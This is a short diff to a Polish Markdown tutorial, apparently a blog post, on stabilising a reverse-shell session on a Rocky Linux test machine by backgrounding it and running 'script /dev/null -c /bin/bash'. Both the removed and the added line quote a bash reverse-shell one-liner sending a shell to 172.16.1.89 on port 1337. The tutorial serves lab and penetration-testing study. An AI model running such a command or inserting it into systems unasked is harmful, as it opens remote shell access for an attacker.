@@ -267,7 +267,7 @@ Polecam ten drugi sposób z uruchomieniem programu **Script**
 ```bash
 [root@rocky8-test1 ~]# ^[[D^[[D^[[D^[[D
 ```
-Po wejściu na konsolę, podczas ruszania strzałkami są **krzaki**. również po naciśnięciu **ctrl+c** wychodzi się z konsoli. Jest jednak na to rada. Jednak od razu wspomnę, że nie za dobrze to działa, kiedy uruchamiamy komendę przez _bash -i &> /dev/tcp/172.16.1.89/1337 0>&1_. Jednak z **Nc** działa prawie, że idealnie. Więc kiedy jesteśmy już w konsoli wciskamy **ctrl+z** (zadanie w tle)
+Po wejściu na konsolę, podczas ruszania strzałkami są **krzaki**. Również po naciśnięciu **ctrl+c** wychodzi się z konsoli. Jest na to rada. Kiedy uruchamiamy nasz **Reverse Shell** przez _bash -i &> /dev/tcp/172.16.1.89/1337 0>&1_, lub podanymi wcześniej sposobami należy pamiętać o wpisaniu _script /dev/null -c /bin/bash_. Więc kiedy jesteśmy już w konsoli wciskamy **ctrl+z** (zadanie w tle)
 {: .text-justify}
 ```bash
 [root@rocky8-test1 ~]# ^Z      
